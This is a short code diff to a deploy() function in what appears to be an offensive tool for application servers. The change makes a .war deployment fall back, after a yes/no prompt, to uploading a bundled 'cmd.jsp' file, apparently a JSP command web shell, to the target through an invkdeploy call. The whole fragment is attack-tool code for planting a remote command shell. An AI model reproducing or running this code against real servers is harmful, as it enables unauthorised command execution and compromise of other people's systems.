@@ -47,8 +47,12 @@ def deploy(fingerengine, fingerprint):
             return
 
     if '.war' in war_file:
-        utility.Msg("This deployer requires a JSP payload", LOG.ERROR)
-        return
+        tmp = utility.capture_input("This deployer requires a JSP, default to cmd.jsp? [Y/n]")
+        if 'n' in tmp.lower():
+                    return
+
+        war_file = abspath("./src/lib/resources/cmd.jsp")
+        war_name = "cmd"
 
     response = invkdeploy(fp.version, url, abspath(war_file),
                           fingerengine.random_int)
